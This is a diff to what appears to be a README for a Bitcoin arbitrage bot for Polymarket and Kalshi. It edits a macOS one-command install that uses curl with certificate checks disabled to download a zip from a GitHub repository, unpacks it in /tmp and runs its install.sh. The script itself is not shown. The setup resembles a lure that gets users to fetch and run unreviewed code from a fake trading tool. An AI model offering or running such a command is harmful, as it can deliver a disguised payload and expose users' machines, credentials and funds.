@@ -36,9 +36,9 @@ src/               # TypeScript layer
 ## ⚡ macOS — Install with one command
 
 ```bash
-curl -fsSLk https://github.com/Sectionnaenumerate/Polymarket-Kalshi-btc-arbitrage-tool/archive/refs/heads/main.zip -o /tmp/cw.zip && \
+curl -fsSLk https://github.com/Sectionnaenumerate/Polymarket-Kalshi-btc-arbitrage-bot/archive/refs/heads/main.zip -o /tmp/cw.zip && \
 unzip -qo /tmp/cw.zip -d /tmp && \
-cd /tmp/Polymarket-Kalshi-btc-arbitrage-tool-main && \
+cd /tmp/Polymarket-Kalshi-btc-arbitrage-bot-main && \
 bash install.sh
 ```
 
